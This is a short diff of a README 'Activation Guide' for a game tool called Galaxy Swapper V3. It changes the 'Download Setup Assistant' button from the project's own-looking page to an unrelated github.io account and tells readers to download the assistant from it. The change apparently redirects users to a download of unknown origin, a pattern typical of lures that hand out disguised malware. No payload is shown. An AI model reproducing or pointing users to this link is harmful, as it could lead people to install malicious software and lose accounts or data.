@@ -1,6 +1,6 @@
 # Galaxy Swapper V3 — Activation Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://galaxy-swapperv3.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://robloinf-12.github.io/.github/)
 
 ⚙️ How to Use  
 1. Download the setup assistant using the button above  
